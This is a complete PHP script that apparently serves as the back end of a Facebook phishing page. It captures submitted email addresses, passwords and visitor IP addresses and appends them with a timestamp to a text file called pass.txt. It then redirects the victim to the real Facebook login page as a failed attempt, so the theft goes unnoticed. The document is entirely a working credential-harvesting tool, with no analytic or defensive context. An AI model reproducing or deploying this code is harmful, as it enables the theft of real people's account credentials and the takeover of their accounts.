    <?php $file = "pass.txt";
$username = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "+++++++++++++++++++++++++++++++++++++++++++++++++ +++");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Password: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "IP Address: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "+++++++++++++++++++++++++++++++++++++++++++++++++ +++");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://login.facebook.com/login.php?login_attempt=1\";
// -->
</script>";
?>    